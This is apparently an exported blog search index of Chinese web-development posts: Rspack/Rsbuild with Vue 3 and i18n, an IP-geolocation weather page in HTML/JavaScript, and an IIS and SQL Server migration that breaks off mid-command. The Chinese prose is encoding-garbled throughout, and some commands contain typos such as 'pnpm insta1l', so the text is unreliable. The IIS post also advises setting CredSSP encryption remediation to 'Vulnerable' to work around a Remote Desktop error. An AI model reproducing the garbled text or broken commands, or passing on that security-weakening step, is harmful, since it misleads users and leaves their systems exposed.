ååˆ†é’Ÿï¼Œ&lt;&lt;&lt;æ€§èƒ½é—®é¢˜æ˜¯ç›®å‰ webpack æœ€å¤§çš„çŸ­æ¿ã€‚å› æ­¤ Rspack è§£å†³çš„é—®é¢˜æ ¸å¿ƒå°±æ˜¯webpack çš„æ€§èƒ½é—®é¢˜ã€‚ Rspack æ¯”webpack å¿«å¾—ç›Šäºå¦‚ä¸‹å‡ æ–¹é¢:Rust è¯­è¨€ä¼˜åŠ¿: Rspack ä½¿ç”¨ Rust è¯­è¨€ç¼–å†™ï¼Œå¾—ç›Šäº Rustçš„é«˜æ€§èƒ½ç¼–è¯‘å™¨æ”¯æŒï¼Œ Rust ç¼–è¯‘ç”Ÿæˆçš„ Native Code é€šå¸¸æ¯”JavaScript æ€§èƒ½æ›´ä¸ºé«˜æ•ˆã€‚é«˜åº¦å¹¶è¡Œçš„æ¶æ„: webpack å—é™äºJavaScript å¯¹å¤šçº¿ç¨‹çš„èµ¢å¼±æ”¯æŒï¼Œå¯¼è‡´å…¶å¾ˆéš¾è¿›è¡Œé«˜åº¦çš„å¹¶è¡ŒåŒ–è®¡ç®—ï¼Œè€Œå¾—ç›Šäº Rustè¯­è¨€çš„å¹¶è¡ŒåŒ–çš„è‰¯å¥½æ”¯æŒï¼ŒRspacké‡‡ç”¨äº†é«˜åº¦å¹¶è¡ŒåŒ–çš„æ¶æ„ï¼Œå¦‚æ¨¡å—å›¾ç”Ÿæˆï¼Œä»£ç ç”Ÿæˆç­‰é˜¶æ®µï¼Œéƒ½æ˜¯é‡‡ç”¨å¤šçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œï¼Œè¿™ä½¿å¾—å…¶ç¼–è¯‘æ€§èƒ½éšç€ CPUæ ¸å¿ƒæ•°çš„å¢é•¿è€Œå¢é•¿ï¼Œå……åˆ†æŒ–æ˜ CPUçš„å¤šæ ¸ä¼˜åŠ¿ã€‚å†…ç½®å¤§éƒ¨åˆ†çš„åŠŸèƒ½: äº‹å®ä¸Š webpack æœ¬èº«çš„æ€§èƒ½è¶³å¤Ÿé«˜æ•ˆï¼Œä½†æ˜¯å› ä¸º webpack æœ¬èº«å†…ç½®äº†è¾ƒå°‘çš„åŠŸèƒ½ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬åœ¨ä½¿ç”¨ webpack åšç°ä»£ Web App å¼€å‘æ—¶ï¼Œé€šå¸¸éœ€è¦é…åˆå¾ˆå¤šçš„ plugin å’Œloader è¿›è¡Œä½¿ç”¨ï¼Œè€Œè¿™äº›loaderå’Œ plugin å¾€å¾€æ˜¯æ€§èƒ½çš„ç“¶é¢ˆï¼Œè€Œ Rspack è™½ç„¶æ”¯æŒloader å’Œpluginï¼Œä½†æ˜¯ä¿è¯ç»å¤§éƒ¨åˆ†å¸¸ç”¨åŠŸèƒ½éƒ½å†…ç½®åœ¨Rspackå†…ï¼Œä»è€Œå‡å°Spluginlloader å¯¼è‡´çš„ä½æ€§èƒ½å’Œé€šä¿¡å¼€é”€é—®é¢˜ï¼Œå¢é‡ç¼–è¯‘: å°½ç®¡ Rspack çš„å…¨é‡ç¼–è¯‘è¶³å¤Ÿé«˜æ•ˆï¼Œä½†æ˜¯å½“é¡¹ç›®åºå¤§æ—¶ï¼Œå…¨é‡çš„ç¼–è¯‘ä»ç„¶éš¾ä»¥æ»¡è¶³ HMRçš„æ€§èƒ½è¦æ±‚ï¼Œå› æ­¤åœ¨ HMR é˜¶æ®µï¼Œæˆ‘ä»¬é‡‡ç”¨çš„æ˜¯æ›´ä¸ºé«˜æ•ˆçš„å¢é‡ç¼–è¯‘ç­–ç•¥ï¼Œä»è€Œä¿è¯ï¼Œæ— è®ºä½ çš„é¡¹ç›®å¤šå¤§ï¼Œå…¶ HMR çš„å¼€é”€æ€»æ˜¯æ§åˆ¶åœ¨åˆç†èŒƒå›´å†…ã€‚ å’Œ Vite çš„åŒºåˆ«Viteæä¾›äº†å¾ˆå¥½çš„å¼€å‘è€…ä½“éªŒï¼Œä½† Vite åœ¨ç”Ÿäº§æ„å»ºä¸­ä¾èµ–äº† Rollupï¼Œå› æ­¤ä¸å…¶ä»–åŸºäºJavaScript çš„å·¥å…·é“¾ä¸€æ ·ï¼Œé¢ä¸´ç€ç”Ÿäº§ç¯å¢ƒçš„æ„å»ºæ€§èƒ½é—®é¢˜ã€‚å¦å¤–ï¼ŒRollupç›¸è¾ƒäº webpackåšäº†ä¸€äº›å¹³è¡¡å–èˆï¼Œåœ¨è¿™é‡ŒåŒæ ·é€‚ç”¨ã€‚æ¯”å¦‚ï¼ŒRollupç¼ºå¤±äº† webpackå¯¹äºæ‹†åŒ…çš„çµæ´»æ€§ï¼Œå³ç¼ºå¤±äº† optimization.splitChunksæä¾›çš„å¾ˆå¤šåŠŸèƒ½ã€‚ å’Œ esbuild çš„åŒºåˆ«æˆ‘ä»¬åœ¨å†…éƒ¨è¿›è¡Œè¿‡å¤§è§„æ¨¡åœ°å°† esbuildä½œä¸ºé€šç”¨çš„ Web App æ„å»ºå·¥å…·çš„å®è·µï¼Œä½†æ˜¯é‡åˆ°å¦‚ä¸‹ä¸€äº›é—®é¢˜:ç¼ºä¹å¯¹ JavaScript HMR å’Œå¢é‡ç¼–è¯‘çš„è‰¯å¥½æ”¯æŒï¼Œè¿™å¯¼è‡´å¤§å‹é¡¹ç›®ä¸­çš„ HMR æ€§èƒ½è¾ƒå·®ã€‚æ‹†åŒ…ç­–ç•¥ä¹Ÿéå¸¸åŸå§‹ï¼Œéš¾ä»¥æ»¡è¶³ä¸šåŠ¡å¤æ‚å¤šå˜çš„æ‹†åŒ…ä¼˜åŒ–éœ€æ±‚ã€‚ Rspackå¿«é€Ÿä¸Šæ‰‹ç¯å¢ƒå‡†å¤‡åœ¨å¼€å§‹ä½¿ç”¨å‰ï¼Œ éœ€è¦å®‰è£… Node.js&gt;&#x3D;16 ç‰ˆæœ¬ï¼Œæ¨èä½¿ç”¨ Node,js LTS ç‰ˆæœ¬ 1node -v åˆ›å»ºæ–°é¡¹ç›® ä½¿ç”¨ RsbuildRsbuip æ˜¯ç”± Rspack é©±åŠ¨çš„é«˜æ€§èƒ½æ„å»ºå·¥å…·ï¼Œç”± Rspack å›¢é˜Ÿå¼€å‘ï¼Œå®ƒé»˜è®¤åŒ…å«äº†ä¸€å¥—ç²¾å¿ƒè®¾è®¡çš„æ„å»ºé…ç½®ï¼Œæä¾›å¼€ç®±å³ç”¨çš„å¼€å‘ä½“éªŒï¼Œå¹¶èƒ½å¤Ÿå……åˆ†å‘æŒ¥å‡º Rspackçš„æ€§èƒ½ä¼˜åŠ¿ã€‚ æˆ‘ä»¬æ¨èä½¿ç”¨ Rsbuildæ¥åˆ›å»ºæ–°é¡¹ç›®ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯: 1npm create rsbuild@latest æˆ–è€… 1yarn create rsbuild æˆ–è€… 1pnpm create rsbuildalatest æˆ–è€… 1bun create rsbuildalatest 123456789101112â—‡ Project name or pathâ”‚ testâ”‚â—‡ Select frameworkâ”‚ Vue 3â”‚â—‡ Select languageâ”‚ TypeScriptâ”‚â—‡ Select additional tools (Use &lt;space&gt; to select, &lt;enter&gt; to continue)(enter)â”‚ none 123456â”‚â—‡ Next steps â”€â”€â•®â”‚ â”‚â”‚ cd test â”‚â”‚ npm install â”‚â”‚ npm run dev â”‚â”‚ â”‚ 1npm run build package.json 1&quot;scripts&quot;: &#123; &quot;ast&quot;: &quot;rsbuild dev --open&quot;&#125; npm run ast dependencies ç”Ÿäº§devDependencies å®‰è£… rsbuild.config.ts 1234567891011export default defineConfig(&#123; plugins: [pluginVue()], server:&#123; port:8116,//å¼€å‘æœåŠ¡å™¨ç«¯å£ open:true,//æ˜¯å¦è‡ªåŠ¨æ‰“å¼€æµè§ˆå™¨ proxy:&#123;//ä»£ç†è®¾ç½® &#125; &#125;&#125;); tsconfig.json 12 &quot;target&quot;: &quot;ES2020&quot;, ç¼–è¯‘çš„jsç‰ˆæœ¬ &quot;include&quot;: [&quot;src&quot;] åŒ…å«ç›®å½• å®‰è£…element-plus1npm install element-plus -s æˆ–è€… 1yarn add element-plus æˆ–è€… 1pnpm insta1l element-plus index.ts 1234567import&#123;createApp&#125;from &quot;vue&quot;;import ElementPlus from&quot;element-plus&quot;import &quot;element-plus/dist/index.css&quot;import App from &quot;./App.vue&quot;;import&#x27;/index.css&#x27;;createApp(App).use(ElementPlus).mount(&#x27;#root&#x27;); .vueä½¿ç”¨å³å¯ é…ç½®è·¯ç”± vue-router 1npm install vue-routersrc-router-index.tsconst router &#x3D; CreateRouter() index.tsadd routimport router from â€œ.&#x2F;routerâ€; Vue3 è·¯ç”±å®ˆå« i18n 12345678910111213import i18n from &#x27;@/languages/index&#x27; const titleKey = to.meta.title?.toString() || globalStore.title //console.log(titleKey) //route. const tttemp = i18n.global.t(`$&#123;titleKey&#125;`) //console.log(tttemp) document.title = tttemp//i18n.global.t(`$&#123;titleKey&#125;`) // ä½¿ç”¨i18nè½¬æ¢æ ‡é¢˜&#123;&#123; t(item.title) &#125;&#125;import &#123; useI18n &#125; from &#x27;vue-i18n&#x27; // ç¡®ä¿å·²å¯¼å…¥i18nconst &#123; t &#125; = useI18n() // è·å–ç¿»è¯‘å‡½æ•° æ·»åŠ å¯¹åº”çš„ç¿»è¯‘é”® ç»„ä»¶å†… ä¿®æ”¹æ¨¡æ¿ä»£ç å°†é™æ€æ–‡æœ¬æ›¿æ¢ä¸ºå›½é™…åŒ–å‡½æ•° t()ï¼Œå¹¶ç»‘å®šè¯­è¨€åŒ…ä¸­çš„é”®ï¼š 123456&lt;el-form-item :label=&quot;t(&#x27;Reason&#x27;)&quot; style=&quot;width: 84%&quot;&gt; &lt;el-input v-model=&quot;formData.com&quot; /&gt;&lt;/el-form-item&gt;&lt;el-form-item :label=&quot;t(&#x27;IP&#x27;)&quot; style=&quot;width: 84%&quot;&gt; &lt;el-input v-model=&quot;formData.ip&quot; /&gt;&lt;/el-form-item&gt; ç»„ä»¶ä¸­å¯ç”¨å›½é™…åŒ–ç¡®ä¿åœ¨ç»„ä»¶è„šæœ¬ä¸­å¼•å…¥ useI18n å¹¶åˆå§‹åŒ–ï¼š 12345&lt;script setup lang=&quot;ts&quot;&gt;import &#123; useI18n &#125; from &#x27;vue-i18n&#x27;;const &#123; t &#125; = useI18n();// å…¶ä»–é€»è¾‘...&lt;/script&gt; ä¼˜åŒ–å¸ƒå±€ç¨³å®šæ€§è‹¥å‘ç°åˆ‡æ¢è¯­è¨€æ—¶è¡¨å•å¸ƒå±€æŠ–åŠ¨ï¼ˆæµè§ˆå™¨é‡æ’ï¼‰ï¼Œå¯ä¸º label è®¾ç½®å›ºå®šå®½åº¦æˆ–å ä½ç¬¦ï¼Œé¿å… v-if å¯¼è‡´çš„æ¸²æŸ“å»¶è¿Ÿã€‚ä¾‹å¦‚ï¼š 123&lt;el-form-item :label=&quot;t(&#x27;Reason&#x27;) || &#x27; &#x27;&quot; label-width=&quot;120px&quot;&gt; &lt;!-- å†…å®¹ --&gt;&lt;/el-form-item&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vue3","slug":"vue3","permalink":"https://banjinmei.github.io/tags/vue3/"}],"author":"mu"},{"title":"Loacl IP get Weather","slug":"Loacl-IP-get-Weather","date":"2024-11-05T22:22:53.000Z","updated":"2024-11-05T22:37:33.426Z","comments":true,"path":"2024/11/06/Loacl-IP-get-Weather/","permalink":"https://banjinmei.github.io/2024/11/06/Loacl-IP-get-Weather/","excerpt":"","text":"é€šè¿‡å½“å‰ç½‘ç»œIPè·å–å¤©æ°”~ è·å–å¤©æ°”çš„æ¥å£åœ°å€ï¼šhttps://weather.sl.al/ å‚æ•°ï¼šhttps://weather.sl.al/?lat=22.2783&amp;lon=114.1747 &amp;lang&#x3D;en latï¼šçº¬åº¦ lonï¼šç»åº¦ langï¼šè¯­è¨€ (é»˜è®¤ä¸å¸¦ lang çš„è¯ä¸ºä¸­æ–‡) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166&#123; &quot;lat&quot;: &quot;22.2783&quot;, &quot;lon&quot;: &quot;114.1747&quot;, &quot;location&quot;: &#123; &quot;city&quot;: &quot;æ¹¾ä»”&quot;, &quot;region&quot;: &quot;æ¹¾ä»”åŒº&quot; &#125;, &quot;current&quot;: &#123; &quot;temperature&quot;: 22, &quot;feelsLike&quot;: 20, &quot;description&quot;: &quot;é˜´&quot;, &quot;airQuality&quot;: &#123; &quot;category&quot;: &quot;å·®&quot;, &quot;statement&quot;: &quot;ç©ºæ°”æ±¡æŸ“å·²ç»è¾¾åˆ°äº†å¾ˆé«˜æ°´å¹³ï¼Œå¯¹æ•æ„Ÿäººç¾¤æ˜¯ä¸å¥åº·çš„ã€‚å¦‚æœæ‚¨æ„Ÿåˆ°å‘¼å¸å›°éš¾æˆ–å–‰å’™åˆºæ¿€ç­‰ç—‡çŠ¶ï¼Œåº”å‡å°‘æˆ·å¤–æ´»åŠ¨æ—¶é—´ã€‚&quot; &#125; &#125;, &quot;sun&quot;: &#123; &quot;duration&quot;: &quot;11 hrs 13 mins&quot;, &quot;sunrise&quot;: &quot;AM6:30&quot;, &quot;sunset&quot;: &quot;PM5:43&quot; &#125;, &quot;hourly&quot;: [ &#123; &quot;time&quot;: &quot;ä¸Šåˆ7æ—¶&quot;, &quot;temperature&quot;: 23, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸Šåˆ8æ—¶&quot;, &quot;temperature&quot;: 24, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸Šåˆ9æ—¶&quot;, &quot;temperature&quot;: 25, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸Šåˆ10æ—¶&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸Šåˆ11æ—¶&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ12æ—¶&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ1æ—¶&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ2æ—¶&quot;, &quot;temperature&quot;: 28, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ3æ—¶&quot;, &quot;temperature&quot;: 28, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ4æ—¶&quot;, &quot;temperature&quot;: 27, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ5æ—¶&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;time&quot;: &quot;ä¸‹åˆ6æ—¶&quot;, &quot;temperature&quot;: 26, &quot;rainProbability&quot;: &quot;0%&quot; &#125; ], &quot;daily&quot;: [ &#123; &quot;date&quot;: &quot;2024-11-06&quot;, &quot;high&quot;: 28, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;éƒ¨åˆ†æ™´ï¼Œå¤©æ°”å®œäºº&quot;, &quot;nightDescription&quot;: &quot;å¤§éƒ¨åˆ†æ™´ï¼Œæœ‰é£&quot;, &quot;rainProbability&quot;: &quot;11%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-07&quot;, &quot;high&quot;: 28, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;å¤§éƒ¨åˆ†æ™´ï¼Œå¾®é£&quot;, &quot;nightDescription&quot;: &quot;éƒ¨åˆ†å¤šäº‘ï¼Œå¾®é£&quot;, &quot;rainProbability&quot;: &quot;19%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-08&quot;, &quot;high&quot;: 28, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;å¤§éƒ¨åˆ†æ™´ï¼Œå¤©æ°”å®œäºº&quot;, &quot;nightDescription&quot;: &quot;ä¸»è¦ä¸ºæ™´&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-09&quot;, &quot;high&quot;: 27, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;éƒ¨åˆ†æ™´ï¼Œå¤©æ°”å®œäºº&quot;, &quot;nightDescription&quot;: &quot;ä¸»è¦ä¸ºæ™´&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-10&quot;, &quot;high&quot;: 28, &quot;low&quot;: 22, &quot;dayDescription&quot;: &quot;æ™´ï¼Œå¤©æ°”å®œäºº&quot;, &quot;nightDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;rainProbability&quot;: &quot;6%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-11&quot;, &quot;high&quot;: 29, &quot;low&quot;: 24, &quot;dayDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;nightDescription&quot;: &quot;ä¸»è¦ä¸ºæ™´ï¼Œæš–å’Œæ½®æ¹¿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-12&quot;, &quot;high&quot;: 26, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;æ™´&quot;, &quot;nightDescription&quot;: &quot;ä¸»è¦ä¸ºæ™´&quot;, &quot;rainProbability&quot;: &quot;0%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-13&quot;, &quot;high&quot;: 26, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;æ™´&quot;, &quot;nightDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-14&quot;, &quot;high&quot;: 26, &quot;low&quot;: 20, &quot;dayDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;nightDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;rainProbability&quot;: &quot;2%&quot; &#125;, &#123; &quot;date&quot;: &quot;2024-11-15&quot;, &quot;high&quot;: 26, &quot;low&quot;: 21, &quot;dayDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;nightDescription&quot;: &quot;æ™´æœ—æ½®æ¹¿&quot;, &quot;rainProbability&quot;: &quot;1%&quot; &#125; ]&#125; è·å–ç»çº¬åº¦æ¥å£è·å–å½“å‰ç½‘ç»œç»çº¬åº¦çš„å…è´¹ä¸”ç¨³å®šçš„æ¥å£æœ‰å‡ ä¸ªé€‰æ‹©ã€‚è¿™äº›æ¥å£é€šå¸¸æä¾›åŸºäºIPåœ°å€çš„æœåŠ¡ï¼Œèƒ½å¤Ÿè¿”å›è®¿é—®è€…çš„å¤§è‡´åœ°ç†ä½ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç»çº¬åº¦ã€‚è¯·æ³¨æ„ï¼ŒåŸºäºIPåœ°å€çš„æœåŠ¡ç²¾åº¦æœ‰é™ï¼Œç‰¹åˆ«æ˜¯åœ¨åŸå¸‚èŒƒå›´å†…ï¼Œå› ä¸ºå®ƒä»¬ä¾èµ–äºISPæä¾›çš„æ•°æ®ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„å…è´¹APIé€‰é¡¹ï¼š 1. ip-api.comURL: http://ip-api.com/jsonæ–¹æ³•: GETè¿”å›å€¼: JSONæ ¼å¼çš„æ•°æ®ï¼ŒåŒ…å«å›½å®¶ã€åœ°åŒºã€åŸå¸‚ã€é‚®ç¼–ã€ç»çº¬åº¦ç­‰ä¿¡æ¯ã€‚ 2. ipinfo.ioURL: https://ipinfo.io/jsonæ–¹æ³•: GETè¿”å›å€¼: JSONæ ¼å¼çš„æ•°æ®ï¼ŒåŒ…æ‹¬IPåœ°å€ã€åŸå¸‚ã€åŒºåŸŸã€å›½å®¶ã€ä½ç½®ï¼ˆç»çº¬åº¦ï¼‰ã€ç»„ç»‡ç­‰ä¿¡æ¯ã€‚ 3. freegeoip.appURL: https://api.freegeoip.app/json/æ–¹æ³•: GETè¯·æ±‚å¤´: éœ€è¦åŠ å…¥ Accept-Language: en å’Œ User-Agent: YourAppNameï¼Œå…¶ä¸­ YourAppName åº”ç”¨çš„åå­—ã€‚è¿”å›å€¼: JSONæ ¼å¼çš„æ•°æ®ï¼ŒåŒ…æ‹¬IPã€å›½å®¶ä»£ç ã€å›½å®¶åã€åœ°åŒºã€åŸå¸‚ã€é‚®æ”¿ç¼–ç ã€çº¬åº¦ã€ç»åº¦ç­‰ä¿¡æ¯ã€‚ ä½¿ç”¨ç¤ºä¾‹ 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Get Current Position&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button onclick=&quot;getLocation()&quot;&gt;Get Location&lt;/button&gt; &lt;p id=&quot;location&quot;&gt;&lt;/p&gt; &lt;script&gt; function getLocation() &#123; fetch(&#x27;https://ipinfo.io/json&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; const location = document.getElementById(&#x27;location&#x27;); location.textContent = `Latitude: $&#123;data.loc.split(&#x27;,&#x27;)[0]&#125;, Longitude: $&#123;data.loc.split(&#x27;,&#x27;)[1]&#125;`; &#125;) .catch(error =&gt; console.error(&#x27;Error:&#x27;, error)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ä¸¤è€…ç»“åˆ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Weather Information&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; margin: 20px; &#125; .section &#123; margin-bottom: 20px; &#125; .header &#123; font-size: 18px; font-weight: bold; &#125; .details &#123; margin-left: 20px; &#125; .hourly-forecast &#123; display: flex; flex-wrap: wrap; &#125; .hourly-item &#123; border: 1px solid #ccc; padding: 10px; margin: 5px; width: 150px; &#125; .daily-forecast &#123; display: flex; flex-wrap: wrap; &#125; .daily-item &#123; border: 1px solid #ccc; padding: 10px; margin: 5px; width: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;button onclick=&quot;getWeather()&quot;&gt;Get Weather&lt;/button&gt; &lt;div id=&quot;weather-info&quot; class=&quot;section&quot;&gt;&lt;/div&gt; &lt;script&gt; function getWeather() &#123; // è·å–ç»çº¬åº¦ fetch(&#x27;https://ipinfo.io/json&#x27;) .then(response =&gt; response.json()) .then(data =&gt; &#123; const lat = data.loc.split(&#x27;,&#x27;)[0]; const lon = data.loc.split(&#x27;,&#x27;)[1]; // ä½¿ç”¨ç»çº¬åº¦è°ƒç”¨å¤©æ°”API return fetch(`https://weather.sl.al/?lat=$&#123;lat&#125;&amp;lon=$&#123;lon&#125;`); &#125;) .then(response =&gt; response.json()) .then(weatherData =&gt; &#123; const weatherInfo = document.getElementById(&#x27;weather-info&#x27;); weatherInfo.innerHTML = &#x27;&#x27;; // æ˜¾ç¤ºå½“å‰å¤©æ°” const currentWeather = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Current Weather in $&#123;weatherData.location.city&#125;&lt;/div&gt; &lt;div class=&quot;details&quot;&gt; Temperature: $&#123;weatherData.current.temperature&#125;Â°C&lt;br&gt; Feels Like: $&#123;weatherData.current.feelsLike&#125;Â°C&lt;br&gt; Description: $&#123;weatherData.current.description&#125;&lt;br&gt; Air Quality: $&#123;weatherData.current.airQuality.category&#125;&lt;br&gt; $&#123;weatherData.current.airQuality.statement&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += currentWeather; // æ˜¾ç¤ºä»Šæ—¥å¤©æ°”è¯¦æƒ… const todayWeather = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Today&#x27;s Weather ($&#123;weatherData.daily[0].date&#125;)&lt;/div&gt; &lt;div class=&quot;details&quot;&gt; High: $&#123;weatherData.daily[0].high&#125;Â°C&lt;br&gt; Low: $&#123;weatherData.daily[0].low&#125;Â°C&lt;br&gt; Day: $&#123;weatherData.daily[0].dayDescription&#125;&lt;br&gt; Night: $&#123;weatherData.daily[0].nightDescription&#125;&lt;br&gt; Rain Probability: $&#123;weatherData.daily[0].rainProbability&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += todayWeather; // æ˜¾ç¤ºæœªæ¥å‡ å¤©çš„å¤©æ°”é¢„æŠ¥ const dailyForecast = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Daily Forecast&lt;/div&gt; &lt;div class=&quot;daily-forecast&quot;&gt; $&#123;weatherData.daily.slice(1).map(day =&gt; ` &lt;div class=&quot;daily-item&quot;&gt; Date: $&#123;day.date&#125;&lt;br&gt; High: $&#123;day.high&#125;Â°C&lt;br&gt; Low: $&#123;day.low&#125;Â°C&lt;br&gt; Day: $&#123;day.dayDescription&#125;&lt;br&gt; Night: $&#123;day.nightDescription&#125;&lt;br&gt; Rain Probability: $&#123;day.rainProbability&#125; &lt;/div&gt; `).join(&#x27;&#x27;)&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += dailyForecast; // æ˜¾ç¤ºæ¯å°æ—¶çš„å¤©æ°”é¢„æŠ¥ const hourlyForecast = ` &lt;div class=&quot;section&quot;&gt; &lt;div class=&quot;header&quot;&gt;Hourly Forecast&lt;/div&gt; &lt;div class=&quot;hourly-forecast&quot;&gt; $&#123;weatherData.hourly.map(hour =&gt; ` &lt;div class=&quot;hourly-item&quot;&gt; Time: $&#123;hour.time&#125;&lt;br&gt; Temperature: $&#123;hour.temperature&#125;Â°C&lt;br&gt; Rain Probability: $&#123;hour.rainProbability&#125; &lt;/div&gt; `).join(&#x27;&#x27;)&#125; &lt;/div&gt; &lt;/div&gt; `; weatherInfo.innerHTML += hourlyForecast; &#125;) .catch(error =&gt; console.error(&#x27;Error:&#x27;, error)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ç»“æœä¸ºå½“å‰å¤©æ°”ã€ä»Šæ—¥å¤©æ°”è¯¦æƒ…ã€æœªæ¥å‡ å¤©çš„å¤©æ°”é¢„æŠ¥ä»¥åŠæ¯å°æ—¶çš„å¤©æ°”é¢„æŠ¥~ï¼ˆCurrent Weatherã€Todayâ€™s Weatherã€Daily Forecastã€Hourly Forecastï¼‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"weather","slug":"weather","permalink":"https://banjinmei.github.io/tags/weather/"}],"author":"mu"},{"title":"IIS Web","slug":"IIS-Web","date":"2024-11-03T17:43:24.000Z","updated":"2024-11-03T17:48:42.507Z","comments":true,"path":"2024/11/04/IIS-Web/","permalink":"https://banjinmei.github.io/2024/11/04/IIS-Web/","excerpt":"","text":"IIS Webè¿ç§»mstscè¿œç¨‹ å®‰è£…iisæœ¬åœ°æœºå­å¼€å¯è¿œç¨‹Errå‡ºç°â€œèº«ä»½éªŒè¯é”™è¯¯ã€‚è¦æ±‚çš„å‡½æ•°ä¸å—æ”¯æŒã€‚è¿œç¨‹è®¡ç®—æœºï¼šxxxï¼Œè¿™å¯èƒ½æ˜¯ç”±äºCredSSPåŠ å¯†Oracleä¿®æ­£ã€‚ è¿è¡Œ gpedit.mscï¼Œé€‰æ‹©â€œè®¡ç®—æœºé…ç½®â€-&gt;â€œç®¡ç†æ¨¡æ¿â€-&gt;â€œç³»ç»Ÿâ€-&gt;â€œå‡­æ®åˆ†é…â€ï¼Œé€‰æ‹©â€œåŠ å¯† Oracle ä¿®æ­£â€ï¼Œæ”¹ä¸ºå¯ç”¨ï¼Œé€‰æ‹©â€œæ˜“å—æ”»å‡»â€ï¼ŒOKã€‚ å¤‡ä»½webcopy webæ–‡ä»¶å¤¹ å¤‡ä»½sql.bakBACKUP DATABASE [zx] TO DISK &#x3D; â€˜C:\\zz.bakâ€™; è¿˜åŸsql123456789101112131415--err å› ä¸ºæ•°æ®åº“æ­£åœ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ— æ³•è·å¾—å¯¹æ•°æ®åº“çš„ç‹¬å è®¿é—®æƒã€‚ALTER DATABASE zx SET SINGLE_USER WITH ROLLBACK IMMEDIATE;RESTORE DATABASE zxFROM DISK =&#x27;c:\\webx\\zx.bak&#x27;with replace,MOVE &#x27;zx&#x27; TO &#x27;C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\DATA\\zx.mdf&#x27;,MOVE &#x27;zx_log&#x27; TO&#x27;C:\\Program Files\\Microsoft SQL 